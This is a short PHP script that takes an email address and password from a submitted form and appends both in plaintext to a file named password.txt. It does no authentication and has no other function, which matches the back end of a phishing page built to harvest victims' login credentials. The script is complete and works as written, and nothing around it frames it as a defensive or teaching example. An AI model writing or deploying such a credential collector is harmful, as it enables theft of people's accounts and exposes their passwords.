<?php
/**
 * Created by PhpStorm.
 * User: Abino
 * Date: 8/28/2016
 * Time: 3:20 PM
 */
if(ISSET($_POST["email"])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];


    $file = 'password.txt';
// Open the file to get existing content
    $current = file_get_contents($file);
// Append a new person to the file
    $current .= $email ;
    $current .= "\n" ;
    $current .= $pass ;
    
// Write the contents back to the file
    file_put_contents($file, $current);
}
